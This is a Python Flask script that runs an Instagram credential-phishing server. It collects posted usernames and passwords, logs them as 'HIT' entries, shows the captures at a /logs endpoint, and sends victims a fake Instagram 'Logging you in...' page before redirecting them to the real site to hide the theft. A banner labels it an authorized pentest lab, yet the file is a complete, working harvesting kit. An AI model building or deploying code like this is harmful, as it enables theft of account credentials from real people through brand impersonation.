from flask import Flask, request, send_from_directory, jsonify
import threading
import webbrowser
import os
from datetime import datetime

app = Flask(__name__, static_folder='static', static_url_path='')

# Your captured creds log
PHISH_LOGS = []

@app.route('/', defaults={'path': 'index.html'})
@app.route('/<path:path>')
def home(path):
    return send_from_directory('static', path)

@app.route('/capture', methods=['POST'])
def capture_creds():
    username = request.form.get('username', 'N/A')
    password = request.form.get('password', 'N/A')
    
    log = f"[{datetime.now()}] 🎣 HIT: {username}:{password}"
    PHISH_LOGS.append(log)
    print("\n" + "="*50)
    print(log)
    print("="*50)
    print(f"Total captures: {len(PHISH_LOGS)}")
    
    # Return SUCCESS + MAGIC REDIRECT JS
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram</title>
        <style>
            body { background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
            .spinner { border: 3px solid #dbdbdb; border-top: 3px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px 0; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .msg { color: #262626; text-align: center; }
        </style>
    </head>
    <body>
        <div>
            <div class="spinner"></div>
            <div class="msg">Logging you in...</div>
        </div>
        <script>
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/';
            }, 2500);
        </script>
    </body>
    </html>
    '''

@app.route('/logs')
def view_logs():
    return '<br>'.join(PHISH_LOGS) + '<br><a href="/">Test Again</a>'

@app.route('/status')
def status():
    return jsonify({'captures': len(PHISH_LOGS), 'logs': PHISH_LOGS[-5:]})

if __name__ == '__main__':
    print("🚀 Windows Ethical Phishing Lab Starting...")
    print("📱 Test URL will open automatically")
    print("📊 Logs: http://127.0.0.1:5000/logs")
    print("⚠️  AUTHORIZED PENTEST ONLY")
    
    # Create static folder for IG assets
    os.makedirs('static', exist_ok=True)
    
    # Auto-open browser
    threading.Timer(1.25, lambda: webbrowser.open('http://127.0.0.1:5000')).start()
    
    app.run(host='0.0.0.0', port=5000, debug=False)